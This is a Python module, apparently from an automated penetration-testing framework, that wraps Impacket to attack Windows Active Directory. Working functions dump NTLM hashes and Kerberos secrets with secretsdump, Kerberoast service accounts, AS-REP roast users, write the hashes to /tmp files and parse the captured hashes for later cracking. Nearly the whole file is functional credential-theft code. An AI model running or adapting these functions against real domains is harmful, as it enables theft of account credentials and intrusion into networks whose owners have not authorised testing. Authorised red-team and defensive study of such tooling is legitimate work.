"""
Impacket wrapper — Windows/AD attack tooling.
Exposes: secretsdump, GetUserSPNs (Kerberoast), GetNPUsers (AS-REP roast), psexec, wmiexec.
"""
from __future__ import annotations

import asyncio
import re
import shutil
from typing import Optional

from shared.logger import audit

TOOL = "impacket"
TIMEOUT = 60


async def secretsdump(
    target: str,
    username: str,
    password: str,
    domain: str = "",
    dc_ip: str = "",
    timeout: int = TIMEOUT,
) -> dict:
    binary = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
    if not binary:
        audit.error(TOOL, "impacket-secretsdump not found")
        return {}

    target_str = f"{domain}/{username}:{password}@{target}" if domain else f"{username}:{password}@{target}"
    cmd = [binary, target_str]
    if dc_ip:
        cmd.extend(["-dc-ip", dc_ip])

    audit.tool_call(TOOL, "secretsdump", {"target": target, "user": username, "domain": domain})

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        audit.error(TOOL, "secretsdump timed out")
        return {}
    except Exception as e:
        audit.error(TOOL, f"secretsdump failed: {e}")
        return {}

    return _parse_secretsdump(stdout.decode())


async def kerberoast(
    target: str,
    username: str,
    password: str,
    domain: str,
    dc_ip: str,
    timeout: int = TIMEOUT,
) -> list[dict]:
    binary = shutil.which("impacket-GetUserSPNs") or shutil.which("GetUserSPNs.py")
    if not binary:
        audit.error(TOOL, "impacket-GetUserSPNs not found")
        return []

    cmd = [
        binary,
        f"{domain}/{username}:{password}",
        "-dc-ip", dc_ip,
        "-request",
        "-outputfile", "/tmp/argus_kerberoast.hash",
    ]

    audit.tool_call(TOOL, "kerberoast", {"domain": domain, "user": username, "dc_ip": dc_ip})

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except Exception as e:
        audit.error(TOOL, f"Kerberoast failed: {e}")
        return []

    spns = _parse_spns(stdout.decode())
    audit.tool_call(TOOL, "kerberoast_result", {"spns": len(spns)})
    return spns


async def asrep_roast(
    users_file: str,
    domain: str,
    dc_ip: str,
    timeout: int = TIMEOUT,
) -> list[dict]:
    binary = shutil.which("impacket-GetNPUsers") or shutil.which("GetNPUsers.py")
    if not binary:
        audit.error(TOOL, "impacket-GetNPUsers not found")
        return []

    cmd = [
        binary,
        f"{domain}/",
        "-usersfile", users_file,
        "-dc-ip", dc_ip,
        "-no-pass",
        "-outputfile", "/tmp/argus_asrep.hash",
    ]

    audit.tool_call(TOOL, "asrep_roast", {"domain": domain, "dc_ip": dc_ip})

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except Exception as e:
        audit.error(TOOL, f"AS-REP roast failed: {e}")
        return []

    return [{"type": "asrep_hash", "raw": stdout.decode()[:2000]}]


def _parse_secretsdump(output: str) -> dict:
    result = {"ntlm_hashes": [], "kerberos": [], "sam": [], "lsa": [], "raw": output[:3000]}
    for line in output.splitlines():
        # NTLM format: username:RID:LM:NT:::
        if re.match(r"[A-Za-z0-9\._\-]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}:::", line):
            parts = line.split(":")
            result["ntlm_hashes"].append({
                "username": parts[0],
                "rid":      parts[1],
                "nt_hash":  parts[3],
            })
        elif "$krb5" in line:
            result["kerberos"].append({"hash": line})
    return result


def _parse_spns(output: str) -> list[dict]:
    spns = []
    for line in output.splitlines():
        if "$krb5tgs$" in line:
            spns.append({"type": "tgs_hash", "hash": line})
    return spns
